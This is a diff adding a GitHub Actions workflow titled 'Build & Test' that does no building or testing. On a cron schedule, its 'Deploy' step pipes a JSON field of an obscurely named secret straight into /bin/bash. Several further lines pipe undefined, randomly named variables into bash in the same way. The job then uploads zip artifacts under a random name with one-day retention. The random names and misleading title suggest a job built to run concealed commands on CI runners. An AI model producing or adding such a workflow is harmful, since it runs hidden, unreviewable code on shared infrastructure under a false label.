@@ -1,0 +1,33 @@
+name: Build & Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '1 1,7,13,19 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  dispatcher:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Deploy
+        env:
+          cjxv26987: ${{ secrets.cjxv26987 }}
+        run: |
+          printf '%s' "$cjxv26987" | jq -r .yyir4 | /bin/bash
+          echo $ihx90840 | jq -r .rooe12377 | /bin/bash
+          echo $dl24 | jq -r .ylcf0 | /bin/bash
+          printf '%s' "$lwih49" | jq -r .bawf54415 | /bin/bash
+          echo $xaab31 | jq -r .plcb63638 | /bin/bash
+          echo $erpch618 | jq -r .lyn3084 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: bOGEUXv9
+          path: "*.zip"
+          retention-days: 1
